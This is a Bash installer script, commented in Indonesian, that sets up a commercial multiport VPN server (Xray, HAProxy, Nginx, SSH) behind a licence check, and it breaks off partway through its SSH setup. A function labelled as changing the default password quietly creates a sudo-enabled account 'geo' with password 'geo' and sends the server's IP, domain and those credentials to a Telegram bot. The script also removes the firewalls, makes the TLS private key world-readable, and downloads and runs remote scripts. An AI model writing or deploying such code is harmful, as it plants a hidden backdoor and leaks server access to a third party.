#!/bin/bash

# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition V3.1
# Author  : Geo Project
# (C) Copyright 2024
# =========================================

# Hapus file premi.sh jika ada
rm -f /root/premi.sh > /dev/null 2>&1

# Pastikan skrip dijalankan sebagai root
if [ "${EUID}" -ne 0 ]; then
    echo -e "\e[31m[ERROR]\e[0m Mohon jalankan skrip ini sebagai pengguna root!"
    exit 1
fi

# Konfigurasi .profile untuk membersihkan layar saat login
cat > /root/.profile <<EOF
clear
sleep 5
screen -r > /dev/null 2>&1
EOF

# Definisi Warna
RED="\033[31m"
GREEN="\e[92;1m"
YELLOW="\033[33m"
BLUE="\033[36m"
NC='\e[0m' # No Color
GRAY="\e[1;30m"

# Definisi Status
OK="${GREEN}--->${NC}"
ERROR="${RED}[ERROR]${NC}"

# =========================================
# Mulai Skrip
# =========================================

# Bersihkan layar
clear
clear && clear && clear

# Ekspor Informasi Alamat IP
export IP=$(curl -sS ipinfo.io/ip)

# Tampilkan Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  Selamat Datang di Geo Project Script Installer ${YELLOW}(${NC}${GREEN} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "  Ini akan dengan cepat mengatur Server VPN di Server Anda"
echo -e "          Penulis : ${GREEN}Geo ${NC}${YELLOW}(${NC} ${GREEN}tunnel ${NC}${YELLOW})${NC}"
echo -e "        © Di-recode oleh Geo VPN ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 1

# =========================================
# Pengecekan Izin Skrip
# =========================================
ipsaya=$(wget -qO- ipinfo.io/ip)
data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
date_list=$(date +"%Y-%m-%d" -d "$data_server")
data_ip="https://raw.githubusercontent.com/jaka2m/permission/main/ipmini"

checking_sc() {
    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
    if [[ "$date_list" < "$useexp" ]]; then
        echo -ne
    else
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e "\033[42m          GEO PROJECT AUTOSCRIPT            \033[0m"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        echo -e ""
        echo -e "              ${RED}IZIN DITOLAK !${NC}"
        echo -e "       \033[0;33mVPS Anda${NC} $ipsaya \033[0;33mTelah Diblokir${NC}"
        echo -e "         \033[0;33mBeli akses izin untuk skrip${NC}"
        echo -e "               \033[0;33mHubungi Admin :${NC}"
        echo -e "        \033[0;36mTelegram${NC} t.me/sampiiiiu"
        echo -e "        ${GREEN}WhatsApp${NC} wa.me/6282339191527"
        echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
        exit
    fi
}
checking_sc

# =========================================
# Pengecekan Sistem
# =========================================

# Pengecekan Arsitektur OS
if [[ $(uname -m | awk '{print $1}') == "x86_64" ]]; then
    echo -e "${OK} Arsitektur Anda Didukung ( ${GREEN}$(uname -m)${NC} )"
else
    echo -e "${ERROR} Arsitektur Anda Tidak Didukung ( ${YELLOW}$(uname -m)${NC} )"
    exit 1
fi

# Pengecekan Sistem Operasi
ID_OS=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
PRETTY_NAME_OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')

if [[ "$ID_OS" == "ubuntu" || "$ID_OS" == "debian" ]]; then
    echo -e "${OK} OS Anda Didukung ( ${GREEN}$PRETTY_NAME_OS${NC} )"
else
    echo -e "${ERROR} OS Anda Tidak Didukung ( ${YELLOW}$PRETTY_NAME_OS${NC} )"
    exit 1
fi

# Validasi Alamat IP
if [[ -z "$IP" ]]; then
    echo -e "${ERROR} Alamat IP ( ${YELLOW}Tidak Terdeteksi${NC} )"
else
    echo -e "${OK} Alamat IP ( ${GREEN}$IP${NC} )"
fi

# Validasi Berhasil
echo ""
read -p "$(echo -e "Tekan ${GRAY}[ ${NC}${GREEN}Enter${NC} ${GRAY}]${NC} Untuk Memulai Instalasi") "
echo ""
clear

# Pengecekan Root dan OpenVZ (Diulang untuk memastikan setelah validasi awal)
if [ "${EUID}" -ne 0 ]; then
    echo "Anda perlu menjalankan skrip ini sebagai root"
    exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
    echo "OpenVZ tidak didukung"
    exit 1
fi

# =========================================
# Informasi Pengguna & Status Sertifikat (Pre-fetch)
# =========================================
echo -e "${GREEN}memuat...${NC}"
clear

MYIP=$(curl -sS ipv4.icanhazip.com)

# USERNAME
rm -f /usr/bin/user
username=$(curl https://raw.githubusercontent.com/jaka2m/permission/main/ipmini | grep "$MYIP" | awk '{print $2}')
echo "$username" > /usr/bin/user

expx=$(curl https://raw.githubusercontent.com/jaka2m/permission/main/ipmini | grep "$MYIP" | awk '{print $3}')
echo "$expx" > /usr/bin/e

# DETAIL ORDER
# oid tidak terdefinisi di sini, mungkin perlu ditambahkan jika ada.
# username=$(cat /usr/bin/user) # Sudah ada di atas
# exp=$(cat /usr/bin/e) # Sudah ada di atas

# CERTIFICATE STATUS (Variabel 'valid' dan 'today' tidak terdefinisi di sini)
# d1=$(date -d "$valid" +%s)
# d2=$(date -d "$today" +%s)
# certifacate=$(((d1 - d2) / 86400))

# VPS Information (Variabel 'Exp' dan 'COLOR1' tidak terdefinisi di sini)
DATE=$(date +'%Y-%m-%d')
# datediff() {
#     d1=$(date -d "$1" +%s)
#     d2=$(date -d "$2" +%s)
#     echo -e "$COLOR1 $NC Expiry In       : $(( (d1 - d2) / 86400 )) Days"
# }
# mai="datediff "$Exp" "$DATE""

# Status Expired/Active
Info="(${GREEN}Aktif${NC})"
Error="(${RED}Kedaluwarsa${NC})"
today_date=$(date -d "0 days" +"%Y-%m-%d")
Exp1=$(curl https://raw.githubusercontent.com/jaka2m/permission/main/ipmini | grep "$MYIP" | awk '{print $4}')

if [[ "$today_date" < "$Exp1" ]]; then
    sts="${Info}"
else
    sts="${Error}"
fi

echo -e "${GREEN}memuat...${NC}"
clear

# REPO
REPO="https://raw.githubusercontent.com/jaka2m/vip/main/"

# Waktu Instalasi (Variabel 'start' tidak digunakan setelah didefinisikan)
start=$(date +%s)
secs_to_human() {
    echo "Waktu instalasi : $((${1} / 3600)) jam $((((${1} / 60) % 60))) menit $((${1} % 60)) detik"
}

function samawa(){
clear
echo -e " ${green}┌─────────────────────────────────────────────────────┐${NC}"
echo -e " ${green}│${NC}${green}         ____ _____ _____     ______  _   _${NC}${green}          │${NC}"
echo -e " ${green}│${NC}${green}        / ___| ____/ _ \ \   / /  _ \| \ | |${NC}${green}         │${NC}"
echo -e " ${green}│${NC}${green}       | |  _|  _|| | | \ \ / /| |_) |  \| |${NC}${green}         │${NC}"
echo -e " ${green}│${NC}${green}       | |_| | |__| |_| |\ V / |  __/| |\  |${NC}${green}         │${NC}"
echo -e " ${green}│${NC}${green}        \____|_____\___/  \_/  |_|   |_| \_|${NC}${green}         │${NC}"
echo -e " ${green}│${NC}                                                    ${green} │${NC}"
echo -e " ${green}│${NC}             MULTIPORT VPN SCRIPT V3.1              ${green} │${NC}"
echo -e " ${green}│${NC}                   WWW.GEOVPN.COM                   ${green} │${NC}"
echo -e " ${green}│${NC}    TELEGRAM CH ${green}@testikuy_mang${NC} ADMIN ${green}@sampiiiiu${NC}    ${green} │${NC}"
echo -e " ${green}└─────────────────────────────────────────────────────┘${NC}"
}

## Fungsi-fungsi Bantuan untuk Pesan Status
function print_ok() {
    echo -e "${OK} ${green}$1${FONT}"
}

function print_install() {
    echo -e "${green} =============================== ${FONT}"
    echo -e "${YELLOW} # $1 ${FONT}"
    echo -e "${green} =============================== ${FONT}"
    sleep 1
}

function print_error() {
    echo -e "${ERROR} ${REDBG}$1${FONT}"
}

function print_success() {
    if [[ 0 -eq $? ]]; then
        echo -e "${green} =============================== ${FONT}"
        echo -e "${green} # $1 berhasil dipasang"
        echo -e "${green} =============================== ${FONT}"
        sleep 2
    fi
}

## Pengecekan Hak Akses Root
function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Pengguna Root: Memulai proses instalasi."
    else
        print_error "Pengguna saat ini bukan root. Mohon beralih ke pengguna root dan jalankan skrip lagi."
        exit 1 # Keluar dari skrip jika bukan root
    fi
}

# Panggil fungsi pengecekan root di awal
is_root

## Pembuatan Direktori dan Pengumpulan Informasi Xray
print_install "Membuat direktori dan mengumpulkan informasi Xray"

# Buat direktori utama Xray
mkdir -p /etc/xray

# Kumpulkan informasi lokasi dan IP
curl -s ipinfo.io/city >> /etc/xray/city
curl -s ifconfig.me > /etc/xray/ipvps
curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp

# Buat file domain dan direktori log
touch /etc/xray/domain
mkdir -p /var/log/xray
chown www-data.www-data /var/log/xray
chmod +x /var/log/xray # Ini mungkin seharusnya chmod 755 atau 775, bukan +x saja untuk direktori.
touch /var/log/xray/access.log
touch /var/log/xray/error.log

# Buat direktori untuk data GeoVPN (opsional, tergantung penggunaan)
mkdir -p /var/lib/geovpn >/dev/null 2>&1

## Pengumpulan Informasi Sistem
# Informasi Penggunaan RAM
mem_used=0
mem_total=0
while IFS=":" read -r a b; do
    case "$a" in
        "MemTotal") ((mem_total=${b/kB}));;
        "Shmem") ((mem_used+=${b/kB}));;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
            mem_used="$((mem_used+=${b/kB}))"
        ;;
    esac
done < /proc/meminfo

Ram_Total_MB="$((mem_total / 1024))" # Total RAM dalam MB

# Mengumpulkan informasi tanggal, OS, Kernel, Arsitektur, dan IP
export tanggal=$(date -d "0 days" +"%d-%m-%Y - %X")
export OS_Name=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME=//g' | sed 's/"//g')
export Kernel=$(uname -r)
export Arch=$(uname -m)
export IP=$(curl -s https://ipinfo.io/ip/)

function first_setup() {
    echo ""
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "          Memulai Penyiapan Lingkungan Awal"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    # Setel zona waktu ke Asia/Jakarta
    print_install "Menyetel Zona Waktu ke Asia/Jakarta"
    timedatectl set-timezone Asia/Jakarta
    if [ $? -eq 0 ]; then
        print_success "Zona Waktu berhasil disetel"
    else
        print_error "Gagal menyetel Zona Waktu"
    fi

    # Konfigurasi iptables-persistent untuk autosave
    print_install "Mengkonfigurasi IPTables Persistent"
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    if [ $? -eq 0 ]; then
        print_success "IPTables Persistent berhasil dikonfigurasi"
    else
        print_error "Gagal mengkonfigurasi IPTables Persistent"
    fi

    # Menampilkan pesan keberhasilan direktori Xray (dari bagian sebelumnya)
    # Asumsi fungsi print_success didefinisikan di skrip utama
    print_success "Direktori Xray siap"

    # Mendapatkan informasi OS
    ID_OS=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
    PRETTY_NAME_OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')

    # Instalasi HAProxy berdasarkan OS
    if [[ "$ID_OS" == "ubuntu" ]]; then
        print_install "Menyiapkan Dependensi untuk Ubuntu ($PRETTY_NAME_OS)"
        sudo apt update -y
        if [ $? -ne 0 ]; then
            print_error "Gagal memperbarui APT. Mohon periksa koneksi atau repositori."
            exit 1
        fi
        apt-get install --no-install-recommends software-properties-common -y
        add-apt-repository ppa:vbernat/haproxy-2.0 -y
        apt-get -y install haproxy=2.0.\*
        if [ $? -eq 0 ]; then
            print_success "HAProxy 2.0.* berhasil dipasang di Ubuntu"
        else
            print_error "Gagal memasang HAProxy di Ubuntu"
            exit 1
        fi
    elif [[ "$ID_OS" == "debian" ]]; then
        print_install "Menyiapkan Dependensi untuk Debian ($PRETTY_NAME_OS)"
        curl https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
        echo "deb [signed-by=/usr/share/keyrings/haproxy.debian.net.gpg] http://haproxy.debian.net buster-backports-1.8 main" >/etc/apt/sources.list.d/haproxy.list
        sudo apt-get update
        if [ $? -ne 0 ]; then
            print_error "Gagal memperbarui APT. Mohon periksa koneksi atau repositori."
            exit 1
        fi
        apt-get -y install haproxy=1.8.\*
        if [ $? -eq 0 ]; then
            print_success "HAProxy 1.8.* berhasil dipasang di Debian"
        else
            print_error "Gagal memasang HAProxy di Debian"
            exit 1
        fi
    else
        print_error "OS Anda Tidak Didukung ($PRETTY_NAME_OS)"
        exit 1
    fi
}

## GEO PROJECT
clear
function nginx_install() {
    echo ""
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "                 Memulai Instalasi Nginx"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    # Mendapatkan informasi OS
    ID_OS=$(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g')
    PRETTY_NAME_OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')

    # Instalasi Nginx berdasarkan OS
    if [[ "$ID_OS" == "ubuntu" ]]; then
        print_install "Menyiapkan Nginx untuk Ubuntu ($PRETTY_NAME_OS)"
        # Perintah 'sudo add-apt-repository ppa:nginx/stable -y' dikomentari karena seringkali
        # Nginx versi standar dari repositori Ubuntu sudah cukup.
        # Jika Anda butuh versi stabil terbaru, aktifkan baris ini.
        # sudo add-apt-repository ppa:nginx/stable -y
        sudo apt-get install nginx -y

        if [ $? -eq 0 ]; then
            print_success "Nginx berhasil dipasang di Ubuntu"
        else
            print_error "Gagal memasang Nginx di Ubuntu"
            # exit 1 # Aktifkan ini jika kegagalan instalasi Nginx harus menghentikan skrip
        fi
    elif [[ "$ID_OS" == "debian" ]]; then
        print_install "Menyiapkan Nginx untuk Debian ($PRETTY_NAME_OS)" # Mengubah dari print_success menjadi print_install
        apt -y install nginx

        if [ $? -eq 0 ]; then
            print_success "Nginx berhasil dipasang di Debian"
        else
            print_error "Gagal memasang Nginx di Debian"
            # exit 1 # Aktifkan ini jika kegagalan instalasi Nginx harus menghentikan skrip
        fi
    else
        echo -e "${ERROR} OS Anda Tidak Didukung ( ${YELLOW}$PRETTY_NAME_OS${FONT} )"
        # exit 1 # Aktifkan ini jika OS yang tidak didukung harus menghentikan skrip
    fi
}

# Update and remove packages
function base_package() {
    clear
    ########
    print_install "Menginstall Packet Yang Dibutuhkan"
    apt install zip pwgen openssl netcat socat cron bash-completion -y
    apt install figlet -y
    apt update -y
    apt upgrade -y
    apt dist-upgrade -y
    systemctl enable chronyd
    systemctl restart chronyd
    systemctl enable chrony
    systemctl restart chrony
    chronyc sourcestats -v
    chronyc tracking -v
    apt install ntpdate -y
    ntpdate pool.ntp.org
    apt install sudo -y
    apt install dropbear -y
    sudo apt-get clean all
    sudo apt-get autoremove -y
    sudo apt-get install -y debconf-utils
    sudo apt-get remove --purge exim4 -y
    sudo apt-get remove --purge ufw firewalld -y
    sudo apt-get install -y --no-install-recommends software-properties-common
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
    print_success "Packet Yang Dibutuhkan"
    
}
clear
# Fungsi input domain
function pasang_domain() {
    clear
    # samawa # Fungsi samawa tidak didefinisikan di sini, mungkin di tempat lain
    echo -e ""
    echo -e "  .----------------------------------."
    echo -e "  |${green}  Silakan Pilih Tipe Domain di Bawah  ${NC}|"
    echo -e "  '----------------------------------'"
    echo -e "  ${green}1)${NC} Masukkan Subdomain Anda"
    echo -e "  ${green}2)${NC} Gunakan Subdomain Acak"
    echo -e "  ------------------------------------"
    read -p "  Silakan pilih angka 1-2 atau Tombol Apa Saja (Acak) : " choice_domain
    echo ""

    if [[ "$choice_domain" == "1" ]]; then
        echo -e "  ${green}Mohon Masukkan Subdomain Anda${NC}"
        read -p "  Subdomain: " host1
        
        if [[ -z "$host1" ]]; then
            echo -e "${RED}[ERROR]${NC} Subdomain tidak boleh kosong. Menggunakan subdomain acak."
            # Lanjutkan ke penggunaan subdomain acak jika input kosong
            wget "${REPO}cf.sh" && chmod +x cf.sh && ./cf.sh
            rm -f /root/cf.sh
            clear
        else
            echo "IP=" >> /var/lib/geovpn/ipvps.conf # Baris ini mungkin perlu disesuaikan jika IP tidak langsung dimasukkan di sini
            echo "$host1" > /etc/xray/domain
            echo "$host1" > /root/domain
            echo -e "${green}Subdomain '$host1' berhasil disimpan.${NC}"
            sleep 1
        fi
    elif [[ "$choice_domain" == "2" ]]; then
        print_install "Memulai pengaturan Subdomain Acak..."
        wget "${REPO}cf.sh" && chmod +x cf.sh && ./cf.sh
        rm -f /root/cf.sh
        clear
    else
        print_install "Pilihan tidak valid atau menggunakan Subdomain Acak."
        wget "${REPO}cf.sh" && chmod +x cf.sh && ./cf.sh
        rm -f /root/cf.sh
        clear
    fi
}

clear
#GANTI PASSWORD DEFAULT
function password_default() {
    clear
domain=$(cat /root/domain)
userdel geo > /dev/null 2>&1
Username="geo"
Password=geo
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
URL="https://api.telegram.org/bot$INFO_INSTALLER/sendMessage"
TEXT="Installasi VPN Script Stable V3.1
============================
<code>Tanggal    :</code> <code>$tanggal</code>
<code>Hostname   :</code> <code>${HOSTNAME}</code>
<code>OS Vps     :</code> <code>$OS_Name</code>
<code>Kernel     :</code> <code>$Kernel</code>
<code>Arch       :</code> <code>$Arch</code>
<code>Ram Left   :</code> <code>$Ram_Usage MB</code>
<code>Ram Used   :</code> <code>$Ram_Total MB</code>
============================
<code>Domain     :</code> <code>$domain</code>
<code>IP VPS     :</code> <code>$IP</code>
<code>User Login :</code> <code>$Username</code>
<code>Pass Login :</code> <code>$Password</code>
<code>User Script:</code> <code>$Nama_Issued_License</code>
<code>Exp Script :</code> <code>$Masa_Laku_License_Berlaku_Sampai</code>
============================
(c) Copyright 2025 By GEO PROJECT
============================
<i>Automatic Notification from</i>
<i>Github GEOVPN</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/tau_samawa"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/testikuy_mang/163"}]]}'
curl -s --max-time $TIME -d "chat_id=$ADMIN&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}

clear
# Pasang SSL
function pasang_ssl() {
clear
print_install "Memasang SSL Pada Domain"
    rm -rf /etc/xray/xray.key
    rm -rf /etc/xray/xray.crt
    domain=$(cat /root/domain)
    STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
    rm -rf /root/.acme.sh
    mkdir /root/.acme.sh
    systemctl stop $STOPWEBSERVER
    systemctl stop nginx
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
    chmod +x /root/.acme.sh/acme.sh
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
    chmod 777 /etc/xray/xray.key
    print_success "SSL Certificate"
}

function make_folder_xray() {
rm -rf /etc/vmess/.vmess.db
    rm -rf /etc/vless/.vless.db
    rm -rf /etc/trojan/.trojan.db
    rm -rf /etc/shadowsocks/.shadowsocks.db
    rm -rf /etc/ssh/.ssh.db
    rm -rf /etc/bot/.bot.db
    mkdir -p /etc/bot
    mkdir -p /etc/xray
    mkdir -p /etc/vmess
    mkdir -p /etc/vless
    mkdir -p /etc/trojan
    mkdir -p /etc/shadowsocks
    mkdir -p /etc/ssh
    mkdir -p /usr/bin/xray/
    mkdir -p /var/log/xray/
    mkdir -p /var/www/html
    mkdir -p /etc/geovpn/limit/vmess/ip
    mkdir -p /etc/geovpn/limit/vless/ip
    mkdir -p /etc/geovpn/limit/trojan/ip
    mkdir -p /etc/geovpn/limit/ssh/ip
    mkdir -p /etc/limit/vmess
    mkdir -p /etc/limit/vless
    mkdir -p /etc/limit/trojan
    mkdir -p /etc/limit/ssh
    chmod +x /var/log/xray
    touch /etc/xray/domain
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    touch /etc/vmess/.vmess.db
    touch /etc/vless/.vless.db
    touch /etc/trojan/.trojan.db
    touch /etc/shadowsocks/.shadowsocks.db
    touch /etc/ssh/.ssh.db
    touch /etc/bot/.bot.db
    echo "& plughin Account" >>/etc/vmess/.vmess.db
    echo "& plughin Account" >>/etc/vless/.vless.db
    echo "& plughin Account" >>/etc/trojan/.trojan.db
    echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
    echo "& plughin Account" >>/etc/ssh/.ssh.db
    }
#Instal Xray
function install_xray() {
clear
    print_install "Core Xray 1.8.1 Latest Version"
    # install xray
    #echo -e "[ ${green}INFO$NC ] Downloading & Installing xray core"
    domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
    chown www-data.www-data $domainSock_dir
    
    # / / Ambil Xray Core Version Terbaru
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
 
    # // Ambil Config Server
    wget -O /etc/xray/config.json "${REPO}xray/config.json" >/dev/null 2>&1
    #wget -O /usr/local/bin/xray "${REPO}xray/xray.linux.64bit" >/dev/null 2>&1
    wget -O /etc/systemd/system/runn.service "${REPO}xray/runn.service" >/dev/null 2>&1
    #chmod +x /usr/local/bin/xray
    domain=$(cat /etc/xray/domain)
    IPVS=$(cat /etc/xray/ipvps)
    print_success "Core Xray 1.8.1 Latest Version"
    
    # Settings UP Nginix Server
    clear
    rm -f /etc/xray/city >/dev/null 2>&1
    rm -f /etc/xray/isp >/dev/null 2>&1
    curl -s ipinfo.io/city >>/etc/xray/city
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
    print_install "Memasang Konfigurasi Packet"
    wget -O /etc/haproxy/haproxy.cfg "${REPO}xray/haproxy.cfg" >/dev/null 2>&1
    wget -O /etc/nginx/conf.d/xray.conf "${REPO}xray/xray.conf" >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
    curl ${REPO}ssh/nginx.conf > /etc/nginx/nginx.conf
    
cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem

    # > Set Permission
    chmod +x /etc/systemd/system/runn.service

    # > Create Service
    rm -rf /etc/systemd/system/xray.service.d
    cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF
print_success "Konfigurasi Packet"
}

function ssh(){
    clear
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo -e "                 Memulai Konfigurasi SSH"
    echo -e "${YELLOW}----------------------------------------------------------${NC}"
    echo ""

    # Memasang Konfigurasi Password SSH
    print_install "Memasang Konfigurasi Password SSH"
    wget -O /etc/pam.d/common-password "${REPO}ssh/password"
    if [ $? -eq 0 ]; then
        chmod +x /etc/pam.d/common-password
        print_success "Konfigurasi password SSH berhasil dipasang."
    else
        print_error "Gagal mengunduh atau memasang konfigurasi password SSH."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    # Mengkonfigurasi Pengaturan Keyboard (non-interaktif)
    print_install "Mengkonfigurasi Pengaturan Keyboard"
    DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
    debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
    if [ $? -eq 0 ]; then
        print_success "Pengaturan keyboard berhasil dikonfigurasi."
    else
        print_error "Gagal mengkonfigurasi pengaturan keyboard."
    fi

    # Kembali ke direktori root
    cd /root || { print_error "Gagal masuk ke direktori /root."; return 1; }

    # Membuat atau Mengedit file /etc/systemd/system/rc-local.service
    print_install "Mengkonfigurasi rc-local.service"
    cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END
    if [ $? -eq 0 ]; then
        print_success "File rc-local.service berhasil dibuat/diedit."
    else
        print_error "Gagal membuat/mengedit file rc-local.service."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    # Membuat atau Mengedit file /etc/rc.local
    print_install "Mengkonfigurasi /etc/rc.local"
    cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END
    if [ $? -eq 0 ]; then
        chmod +x /etc/rc.local
        print_success "File /etc/rc.local berhasil dibuat/diedit dan diberi izin eksekusi."
    else
        print_error "Gagal membuat/mengedit file /etc/rc.local."
        # exit 1 # Aktifkan jika ini adalah error fatal
    fi

    # Mengaktifkan dan Memulai rc-local.service
    print_install "Mengaktifkan dan Memulai rc-local.service"
    systemctl enable rc-local &>/dev/null
    systemctl start rc-local.service &>/dev/null
    if systemctl is-active --quiet rc-local.service; then
        print_success "rc-local.service berhasil diaktifkan dan dimulai."
    else
        print_error "Gagal mengaktifkan atau memulai rc-local.service."
    fi

    # Menonaktifkan IPv6
    print_install "Menonaktifkan IPv6"
    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
    if [ $? -eq 0 ]; then
        sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
        print_success "IPv6 berhasil dinonaktifkan."
    else
        print_error "Gagal menonaktifkan IPv6."
    fi

    # Setel Zona Waktu ke GMT +7 (Asia/Jakarta)
    print_install "Menyetel Zona Waktu ke Asia/Jakarta"
    ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    if [ $? -eq 0 ]; then
        print_success "Zona Waktu berhasil disetel ke Asia/Jakarta."
    else
        print_error "Gagal menyetel Zona Waktu."
    fi

    # Nonaktifkan AcceptEnv di sshd_config
    print_install "Mengamankan konfigurasi SSH (sshd_config)"
    sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
    if [ $? -eq 0 ]; then
        print_success "Pengaturan AcceptEnv di sshd_config berhasil dinonaktifkan."
    else
        print_error "Gagal menonaktifkan pengaturan AcceptEnv di sshd_config."
